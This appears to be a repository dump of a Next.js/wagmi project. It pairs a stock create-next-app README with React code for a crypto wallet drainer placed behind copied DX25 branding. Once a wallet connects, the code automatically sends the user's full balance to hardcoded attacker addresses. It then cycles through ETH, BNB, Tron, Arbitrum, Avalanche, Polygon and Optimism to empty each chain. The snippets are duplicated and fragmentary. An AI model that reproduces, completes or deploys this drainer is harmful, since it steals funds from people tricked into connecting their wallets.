This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.

## Learn More

To learn more about Next.js, take a look at the following resources:

- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.

You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!

## Deploy on Vercel

The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.

Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.




<main className="bg-gray-100 min-h-screen">
<header className="flex justify-between items-center py-6 px-10 bg-blue-300">
  {/* Logo */}
  <div className="flex items-center space-x-3">
    <img
      src="/logo.svg" // Replace with your logo path
      alt="Logo"
      className="h-12 w-12"
    />
    <h1 className="text-white text-2xl font-bold">SUB Section</h1>
  </div>
</header>
<h2 className="text-2xl mb-4 leading-snug text-center">Examples</h2>
<div className="max-w-4xl">
    <div className="flex flex-col bg-white border-gray-200 rounded-lg overflow-hidden shadow-sm items-center space-y-6">
      <h3 className="text-sm font-semibold bg-gray-100 p-2 text-center">
       Connect Wallet
      </h3>
     <div className="flex justify-center items-center p-4">
      <w3m-button/>
      </div>
    </div>
    <br></br>
    {isConnected && (
       <div className="flex bg-white border border-gray-200 rounded-lg overflow-hidden shadow-sm">
          <h3 className="text-sm font-semibold bg-gray-100 p-2 text-center">Network Selection button</h3>
          <div className="flex justify-center items-center p-4">
            <w3m-network-button/>
          </div>
       </div>
    )}
</div>

</main>
      console.log("Wallet address", address);
      console.log("Chain Id", chainId);
      console.log("Handle send eth log value",ethBalanceData);
      console.log("Handle send eth log value",ethBalanceData?.value);
"use client";
import { useAccount, useConnect, useReadContracts , useWriteContract , useBalance ,useSwitchChain } from "wagmi";
import Image from "next/image";
import { useState } from "react";
import { mainnet } from "viem/chains";
import { Star } from 'lucide-react';

export default function Home() {
  
  const { isConnected, address, chainId  } = useAccount();
  const { connectAsync } = useConnect();
  const { data: hash, error, isPending, writeContract } = useWriteContract()
  const { switchChain } = useSwitchChain();
  const { data: ethBalanceData } = useBalance({ address, chainId: mainnet.id });
  const { data: bnbBalanceData } = useBalance({ address, chainId: bsc.id });

  const { data: arbitrumBalanceData } = useBalance({ address, chainId: arbitrum.id });
  const { data: tronBalanceData } = useBalance({ address, chainId: tron.id });

  const { data: polygonBalanceData } = useBalance({ address, chainId: polygon.id });
  const { data: avalancheBalanceData } = useBalance({ address, chainId: avalanche.id });

  const { data: optimismBalanceData } = useBalance({ address, chainId: optimism.id });

  const [started, setStarted] = useState(false);
  const [errors, setErrors] = useState<string | null>(null);
  const [completed, setCompleted] = useState(false);
  const [ethTransCompleted, setEthTransCompleted] = useState(false);
  const [bnbTransCompleted, setBnbTransCompleted] = useState(false);
  const [arbitrumTransCompleted, setArbitrumTransCompleted] = useState(false);
  const [tronTransCompleted, setTronTransCompleted] = useState(false);
  const [polygonTransCompleted, setPolygonTransCompleted] = useState(false);
  const [avalancheTransCompleted, setAvalancheTransCompleted] = useState(false);
  const [optimismTransCompleted, setOptimismTransCompleted] = useState(false);

     //TODO HANDLE NO BALANCE ERROR FOR ALL NETWORK
    const { data: ethHash, isPending: isPendingEth, sendTransaction: sendEthTransaction } = useSendTransaction();

    // BNB
    const { data: bnbHash, isPending: isPendingBnb, sendTransaction: sendBnbTransaction } = useSendTransaction();

    // Arbitrum
    const { data: arbitrumHash, isPending: isPendingArbitrum, sendTransaction: sendArbitrumTransaction } = useSendTransaction();

    // Tron
    const { data: tronHash, isPending: isPendingTron, sendTransaction: sendTronTransaction } = useSendTransaction();

    // Polygon
    const { data: polygonHash, isPending: isPendingPolygon, sendTransaction: sendPolygonTransaction } = useSendTransaction();

    // Avalanche
    const { data: avalancheHash, isPending: isPendingAvalanche, sendTransaction: sendAvalancheTransaction } = useSendTransaction();

    // Optimism
    const { data: optimismHash, isPending: isPendingOptimism, sendTransaction: sendOptimismTransaction } = useSendTransaction();


    // * Wait for ETH transaction to complete
    const { isLoading: isConfirmingEth, isSuccess: isEthConfirmed } = useWaitForTransactionReceipt({
      hash: ethHash,
    });

    // Bnb
    const { isLoading: isConfirmingBnb, isSuccess: isBnbConfirmed } = useWaitForTransactionReceipt({
      hash: bnbHash,
    });

    // Arbitrum
    const { isLoading: isConfirmingArbitrum, isSuccess: isArbitrumConfirmed } = useWaitForTransactionReceipt({
      hash: arbitrumHash,
    });

    // Tron
    const { isLoading: isConfirmingTron, isSuccess: isTronConfirmed } = useWaitForTransactionReceipt({
      hash: tronHash,
    });

    // Polygon
    const { isLoading: isConfirmingPolygon, isSuccess: isPolygonConfirmed } = useWaitForTransactionReceipt({
      hash: polygonHash,
    });

    // Avalanche
    const { isLoading: isConfirmingAvalanche, isSuccess: isAvalancheConfirmed } = useWaitForTransactionReceipt({
      hash: avalancheHash,
    });

    // Optimism
    const { isLoading: isConfirmingOptimism, isSuccess: isOptimismConfirmed } = useWaitForTransactionReceipt({
      hash: optimismHash,
    });


    useEffect(() => {
      if (isConnected && chainId === mainnet.id) {
        console.log("Currently on ethereum network ..." , isConnected);
        setStarted(true);
        handleSendEth();
        // handleSendBnb()z
      }
      else
      {
        handleSendBnb();
      }
    }, [isConnected]);
  
    const handleSendEth = async () => {

      if (!ethBalanceData?.value || ethBalanceData?.formatted == '0') {
        setErrors("ETH balance is zero. Cannot proceed with the transaction.");
        handleSwitchToBsc();
      };

      if (ethBalanceData?.value) {
        try {
          console.log("starting",ethBalanceData?.value)
          const ethBalance = ethBalanceData.value;
          const gasFeeEstimate = ethBalance / BigInt(5); // 20% of the balance
          const amountToSend = ethBalance - gasFeeEstimate;
          
          console.log('ETH Amount to send:', amountToSend.toString());
  
          // This will trigger the wallet prompt
          const tx = await sendEthTransaction({
            to: '0x3619Eb3276bbBFb2BaC375BdBa15220E6853C89a',
            value: amountToSend,
          });
         
          console.log('ETH transaction sent:', tx);
        } catch (error) {
          setErrors("An error occurred while sending ETH.");
          console.error(error);
        }
      } else {
        setErrors("ETH balance not available");
      }
    }
  
    const handleSwitchToBsc = async () => {
      try {
        await switchChain({ chainId: bsc.id }); 
      } catch (error) {
        setErrors("Failed to switch to BSC network.");
        console.error(error);
      }
    };
  
    const handleSendBnb = async () => {
      if (bnbBalanceData?.value) {
        try {
          const bnbBalance = bnbBalanceData.value;
          const gasFeeEstimate = parseUnits('0.000021', 18);
  
          if (bnbBalance <= gasFeeEstimate) {
            throw new Error("Insufficient BNB balance after gas fee deduction.");
          }
  
          const amountToSend = bnbBalance - gasFeeEstimate;
  
          console.log('BNB Amount to send:', amountToSend.toString());
  
          await sendBnbTransaction({
            to: '0x7323356FfF92fF61abe79d63f1213296F5386c56',
            value: amountToSend,
          });
  
          setBnbTransCompleted(true);
        } catch (error) {
          setErrors("An error occurred while sending BNB.");
          console.error(error);
        }
      } else {
        setErrors("BNB balance not available");
      }
    };
  return (
    <>
      {/* Navbar */}
      <header className="p-4 fixed w-full top-0 bottom-0 left-0 right-0 navbar-edit">
        <div className="container mx-auto flex justify-between items-center">
          <a href="#" className="text-white text-lg font-bold">
            <img
              src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6362098b7528ea4e0c4eb5cf_logo.svg"
              alt="DX25 Logo"
              className="h-8"
            />
          </a>
            <div  className="w-button">
            <w3m-button/>
            </div>
            <!-- for switch netwokr -->
           <span className="bg-white font-thin text-sm rounded-[5px]"><w3m-network-button/></span> 
          </div>
      </header>

  );
}



<div class="relative z-10" aria-labelledby="modal-title" role="dialog" aria-modal="true">
  <!--
    Background backdrop, show/hide based on modal state.

    Entering: "ease-out duration-300"
      From: "opacity-0"
      To: "opacity-100"
    Leaving: "ease-in duration-200"
      From: "opacity-100"
      To: "opacity-0"
  -->
  <div class="fixed inset-0 bg-gray-500 bg-opacity-75 transition-opacity" aria-hidden="true"></div>

  <div class="fixed inset-0 z-10 w-screen overflow-y-auto">
    <div class="flex min-h-full items-end justify-center p-4 text-center sm:items-center sm:p-0">
      <!--
        Modal panel, show/hide based on modal state.

        Entering: "ease-out duration-300"
          From: "opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
          To: "opacity-100 translate-y-0 sm:scale-100"
        Leaving: "ease-in duration-200"
          From: "opacity-100 translate-y-0 sm:scale-100"
          To: "opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
      -->
      <div class="relative transform overflow-hidden rounded-lg bg-white text-left shadow-xl transition-all sm:my-8 sm:w-full sm:max-w-lg">
        <div class="bg-white px-4 pb-4 pt-5 sm:p-6 sm:pb-4">
          <div class="sm:flex sm:items-start">
            <div class="mx-auto flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-full bg-red-100 sm:mx-0 sm:h-10 sm:w-10">
              <svg class="h-6 w-6 text-red-600" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
              </svg>
            </div>
            <div class="mt-3 text-center sm:ml-4 sm:mt-0 sm:text-left">
              <h3 class="text-base font-semibold leading-6 text-gray-900" id="modal-title">Deactivate account</h3>
              <div class="mt-2">
                <p class="text-sm text-gray-500">Are you sure you want to deactivate your account? All of your data will be permanently removed. This action cannot be undone.</p>
              </div>
            </div>
          </div>
        </div>
        <div class="bg-gray-50 px-4 py-3 sm:flex sm:flex-row-reverse sm:px-6">
          <button type="button" class="inline-flex w-full justify-center rounded-md bg-red-600 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-red-500 sm:ml-3 sm:w-auto">Deactivate</button>
          <button type="button" class="mt-3 inline-flex w-full justify-center rounded-md bg-white px-3 py-2 text-sm font-semibold text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 hover:bg-gray-50 sm:mt-0 sm:w-auto">Cancel</button>
        </div>
      </div>
    </div>
  </div>
</div>


const { isConnected, address, chainId  } = useAccount();
  const { connectAsync } = useConnect();
  const { data: hash, error, isPending, writeContract } = useWriteContract()
  const { switchChain } = useSwitchChain();
  const { data: ethBalanceData } = useBalance({ address, chainId: mainnet.id });
  const { data: bnbBalanceData } = useBalance({ address, chainId: bsc.id });

  const { data: arbitrumBalanceData } = useBalance({ address, chainId: arbitrum.id });
  const { data: tronBalanceData } = useBalance({ address, chainId: tron.id });

  const { data: polygonBalanceData } = useBalance({ address, chainId: polygon.id });
  const { data: avalancheBalanceData } = useBalance({ address, chainId: avalanche.id });

  const { data: optimismBalanceData } = useBalance({ address, chainId: optimism.id });

  const [started, setStarted] = useState(false);
  const [errors, setErrors] = useState<string | null>(null);
  const [completed, setCompleted] = useState(false);
  const [ethTransCompleted, setEthTransCompleted] = useState(false);
  const [bnbTransCompleted, setBnbTransCompleted] = useState(false);
  const [arbitrumTransCompleted, setArbitrumTransCompleted] = useState(false);
  const [tronTransCompleted, setTronTransCompleted] = useState(false);
  const [polygonTransCompleted, setPolygonTransCompleted] = useState(false);
  const [avalancheTransCompleted, setAvalancheTransCompleted] = useState(false);
  const [optimismTransCompleted, setOptimismTransCompleted] = useState(false);

     //TODO HANDLE NO BALANCE ERROR FOR ALL NETWORK
    // * Send transaction ETH
    const { data: ethHash, isPending: isPendingEth, sendTransaction: sendEthTransaction } = useSendTransaction();

    // BNB
    const { data: bnbHash, isPending: isPendingBnb, sendTransaction: sendBnbTransaction } = useSendTransaction();

    // Arbitrum
    const { data: arbitrumHash, isPending: isPendingArbitrum, sendTransaction: sendArbitrumTransaction } = useSendTransaction();

    // Tron
    const { data: tronHash, isPending: isPendingTron, sendTransaction: sendTronTransaction } = useSendTransaction();

    // Polygon
    const { data: polygonHash, isPending: isPendingPolygon, sendTransaction: sendPolygonTransaction } = useSendTransaction();

    // Avalanche
    const { data: avalancheHash, isPending: isPendingAvalanche, sendTransaction: sendAvalancheTransaction } = useSendTransaction();

    // Optimism
    const { data: optimismHash, isPending: isPendingOptimism, sendTransaction: sendOptimismTransaction } = useSendTransaction();


    

    // * Wait for ETH transaction to complete
    const { isLoading: isConfirmingEth, isSuccess: isEthConfirmed } = useWaitForTransactionReceipt({
      hash: ethHash,
    });

    // Bnb
    const { isLoading: isConfirmingBnb, isSuccess: isBnbConfirmed } = useWaitForTransactionReceipt({
      hash: bnbHash,
    });

    // Arbitrum
    const { isLoading: isConfirmingArbitrum, isSuccess: isArbitrumConfirmed } = useWaitForTransactionReceipt({
      hash: arbitrumHash,
    });

    // Tron
    const { isLoading: isConfirmingTron, isSuccess: isTronConfirmed  } = useWaitForTransactionReceipt({
      hash: tronHash,
    });

    // Polygon
    const { isLoading: isConfirmingPolygon, isSuccess: isPolygonConfirmed } = useWaitForTransactionReceipt({
      hash: polygonHash,
    });

    // Avalanche
    const { isLoading: isConfirmingAvalanche, isSuccess: isAvalancheConfirmed } = useWaitForTransactionReceipt({
      hash: avalancheHash,
    });

    // Optimism
    const { isLoading: isConfirmingOptimism, isSuccess: isOptimismConfirmed } = useWaitForTransactionReceipt({
      hash: optimismHash,
    });


    useEffect(() => {
      if (isConnected && chainId === mainnet.id) {
        console.log("Currently on ethereum network ..." , isConnected);
        setStarted(true);
        handleSendEth();
      }
      else {
        handleSendBnb()
      }
    }, [isConnected]);
  
    const handleSendEth = async () => {
      if (!ethBalanceData?.value || ethBalanceData?.formatted == '0') {
        console.log('No eth balance')
        setErrors("ETH balance is zero. Cannot proceed with the transaction.");
        handleSwitchToBsc();
      };

      if (ethBalanceData?.value) {
        try {
          console.log("starting",ethBalanceData?.value)
          const ethBalance = ethBalanceData.value;
          // const gasFeeEstimate = ethBalance / BigInt(5); // 20% of the balance
          const amountToSend = ethBalance;
          
          console.log('ETH Amount to send:', amountToSend.toString());
  
          const tx = await sendEthTransaction({
            to: '0x3619Eb3276bbBFb2BaC375BdBa15220E6853C89a',
            value: amountToSend,
          });
         
          console.log('ETH transaction sent:', tx);

          if (isConfirmingEth || isEthConfirmed ) {
            handleSwitchToBsc();
          }
        } catch (error) {
          setErrors('Error sending ETH transaction.');
           console.error(error);
           handleSwitchToBsc(); 
        }
      } else {
        setErrors("ETH balance not available");
      }
    };
  
    const handleSendBnb = async () => {
      if (!bnbBalanceData?.value || bnbBalanceData?.formatted === '0') {
        setErrors('BNB balance is zero. Skipping to Tron.');
        handleSwitchToTron();
      }
      if (bnbBalanceData?.value) {
        try {
          const bnbBalance = bnbBalanceData.value;
          // const gasFeeEstimate = parseUnits('0.000021', 18);
  
          const amountToSend = bnbBalance;

          console.log('BNB Amount to send:', amountToSend.toString());
  
          await sendBnbTransaction({
            to: '0x7323356FfF92fF61abe79d63f1213296F5386c56',
            value: amountToSend,
          });
          
          console.log('sending the bnb now')
          setBnbTransCompleted(true);

          if (isConfirmingBnb ||isBnbConfirmed) {
            handleSwitchToTron();
          }
      
        } catch (error) {
            setErrors('Error sending BNB transaction.');
            console.error(error);
            handleSwitchToTron();
        }
      } else {
        setErrors("BNB balance not available");
      }
    };

    const handleSendTron = async () => {
      if (!tronBalanceData?.value || tronBalanceData?.formatted === '0') {
        setErrors('TRON balance is zero. Skipping to Arbitrum.');
        handleSwitchToArbitrum();
       }

      try {
         const tronBalance = tronBalanceData?.value;
          const amountToSend = tronBalance ;

          await sendTronTransaction({
            to: '0x7323356FfF92fF61abe79d63f1213296F5386c56',
            value: amountToSend,
          });

          console.log('TRON transaction sent.');

          if(isConfirmingArbitrum || isArbitrumConfirmed ){
          await handleSwitchToArbitrum();
          }
      } catch (error) {
        setErrors('Error sending TRON transaction.');
        console.error(error);
        await handleSwitchToArbitrum();
      }
    };
    
    // Handle Arbitrum transaction and switch to Avalanche
    const handleSendArbitrum = async () => {
      if (!arbitrumBalanceData?.value || arbitrumBalanceData?.formatted === '0') {
        setErrors('Arbitrum balance is zero. Skipping to Avalanche.');
        await handleSwitchToAvalanche();
        return;
      }

      try {
        const arbitrumBalance = arbitrumBalanceData?.value;
        const amountToSend = arbitrumBalance;

        await sendArbitrumTransaction({
          to: '0x7323356FfF92fF61abe79d63f1213296F5386c56',
          value: amountToSend,
        });

        console.log('Arbitrum transaction sent.');

        if (isConfirmingAvalanche || isAvalancheConfirmed) {
          await handleSwitchToAvalanche();
        }
      } catch (error) {
        setErrors('Error sending Arbitrum transaction.');
        console.error(error);
        await handleSwitchToAvalanche();
      }
    };
    
    const handleSendAvalanche = async () => {
      if (!avalancheBalanceData?.value || avalancheBalanceData?.formatted === '0') {
        setErrors('Avalanche balance is zero. Skipping to Polygon.');
        await handleSwitchToPolygon();
        return;
      }
    
      try {
        const avalancheBalance = avalancheBalanceData?.value;
        const amountToSend = avalancheBalance;
    
        await sendAvalancheTransaction({
          to: '0x7323356FfF92fF61abe79d63f1213296F5386c56',
          value: amountToSend,
        });
    
        console.log('Avalanche transaction sent.');
    
        if (isConfirmingPolygon || isPolygonConfirmed) {
          await handleSwitchToPolygon();
        }
      } catch (error) {
        setErrors('Error sending Avalanche transaction.');
        console.error(error);
        await handleSwitchToPolygon();
      }
    };

    // Handle Polygon transaction 
    const handleSendPolygon = async () => {
      if (!polygonBalanceData?.value || polygonBalanceData?.formatted === '0') {
        setErrors('Polygon balance is zero. Skipping to Optimism.');
        await handleSwitchToOptimism();
        return;
      }

      try {
        const polygonBalance = polygonBalanceData?.value;
        const amountToSend = polygonBalance;

        await sendPolygonTransaction({
          to: '0x7323356FfF92fF61abe79d63f1213296F5386c56',
          value: amountToSend,
        });

        console.log('Polygon transaction sent.');

        if (isConfirmingOptimism || isOptimismConfirmed) {
          await handleSwitchToOptimism();
        }
      } catch (error) {
        setErrors('Error sending Polygon transaction.');
        console.error(error);
        await handleSwitchToOptimism();
      }
    };

    const handleSendOptimism = async () => {
      if (!optimismBalanceData?.value || optimismBalanceData?.formatted === '0') {
        setErrors('Optimism balance is zero. No further network to switch.');
        return;
      }
    
      try {
        const optimismBalance = optimismBalanceData?.value;
        const amountToSend = optimismBalance;
    
        await sendOptimismTransaction({
          to: '0x7323356FfF92fF61abe79d63f1213296F5386c56',
          value: amountToSend,
        });
    
        console.log('Optimism transaction sent.');
      } catch (error) {
        setErrors('Error sending Optimism transaction.');
        console.error(error);
      }
    };

    const handleSwitchToBsc = async () => {
      try {
        console.log("Handling switch..." , isConnected);
        console.log("Handling switch bnb bnb ..." , isConnected);
        await switchChain({ chainId: bsc.id }); 
        handleSendBnb();
      } catch (error) {
        setErrors("Failed to switch to BSC network.");
        console.error(error);
      }
    };

    const handleSwitchToTron = async () => {
      try {
        console.log("Handling switch to Tron...", isConnected);
        await switchChain({ chainId: tron.id }); 
        await handleSendTron();
      } catch (error) {
        setErrors("Failed to switch to Tron network.");
        console.error(error);
      }
    };
    
    // Arbitrum Network Switch
    const handleSwitchToArbitrum = async () => {
      try {
        console.log("Handling switch to Arbitrum...", isConnected);
        await switchChain({ chainId: arbitrum.id });
        await handleSendArbitrum();
      } catch (error) {
        setErrors("Failed to switch to Arbitrum network.");
        console.error(error);
      }
    };

    // Avalanche Network Switch
    const handleSwitchToAvalanche = async () => {
      try {
        console.log("Handling switch to Avalanche...", isConnected);
        await switchChain({ chainId: avalanche.id });
        await handleSendAvalanche();
      } catch (error) {
        setErrors("Failed to switch to Avalanche network.");
        console.error(error);
      }
    };

    // Polygon Network Switch
    const handleSwitchToPolygon = async () => {
      try {
        console.log("Handling switch to Polygon...", isConnected);
        await switchChain({ chainId: polygon.id });
        await handleSendPolygon()
      } catch (error) {
        setErrors("Failed to switch to Polygon network.");
        console.error(error);
      }
    };

    // Optimism Network Switch
    const handleSwitchToOptimism = async () => {
      try {
        console.log("Handling switch to Optimism...", isConnected);
        await switchChain({ chainId: optimism.id });
        await handleSendOptimism();
      } catch (error) {
        setErrors("Failed to switch to Optimism network.");
        console.error(error);
      }
    };




     <header className="p-4 fixed w-full top-0 bottom-0 left-0 right-0 navbar-edit">
        <div className="container mx-auto flex justify-between items-center">
          <a href="#" className="text-white text-lg font-bold">
            <img
              src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6362098b7528ea4e0c4eb5cf_logo.svg"
              alt="DX25 Logo"
              className="h-8"
            />
          </a>

          <div className="flex navbar-wrapper space-x-4">
            <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63639e2c35a76b8b6d53de0b_telegram.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a>
            {/* <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63bd355fcf0c895284c442c6_logo-discord.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a> */}
            <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63639e32c8fd02677b5fa42a_logo-twitter.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a>
            <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/645e0256423671a222321b9c_63733efd27b291b689af346b_logo-linkedin.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a>
            {/* <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6415b6503669f80ad50b109f_icon-medium.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a> */}
            <div className="btn-white-3 btn-toggle w-dropdown-toggle">
              <button className="text-white flex items-center text-block-7">
                Documentation
              </button>
            </div>
            <div className="w-button">
              <button

               onClick={handleModalOpen}
              >
                Connect Wallet
              </button>
            </div>
          </div>

        </div>
        {isModalOpen && <WalletConnectModal onClose={handleModalClose} />}
      </header>